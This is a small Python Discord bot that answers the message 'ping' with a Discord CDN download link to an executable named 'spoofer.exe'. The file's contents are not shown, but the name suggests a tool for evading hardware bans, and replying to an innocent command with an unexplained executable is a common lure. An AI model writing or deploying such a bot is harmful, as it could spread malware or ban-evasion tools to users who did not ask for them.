import discord
import os

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.content.lower() == "ping":
        await message.channel.send("https://cdn.discordapp.com/attachments/1426816304912011359/1428531939073069066/spoofer.exe?ex=68fc120b&is=68fac08b&hm=70bde68babb4048f7699f65135407451e087cc164852400b8623845e4bb0472f&")

TOKEN = os.getenv("DISCORD_TOKEN")
client.run(TOKEN)
